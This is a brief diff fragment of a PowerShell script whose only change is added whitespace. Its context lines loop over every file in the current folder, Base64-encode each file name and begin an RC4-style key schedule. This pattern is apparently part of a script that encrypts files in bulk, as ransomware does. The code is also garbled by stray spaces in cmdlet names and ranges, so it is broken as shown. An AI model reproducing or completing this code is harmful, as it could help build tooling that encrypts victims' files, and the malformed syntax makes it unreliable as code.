@@ -503,7 +503,7 @@ $s = 4;
 $b = 57;
 Get - ChildItem "." | Foreach - Object {
     $a = [System.Convert]::ToBase64String($Enc.GetBytes($_.Name));
-    $R = {
+    $R = { 
         $D,
         $K = $Args;$S = 0. .255;0. .255 | % {
             $J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;$S[$_],
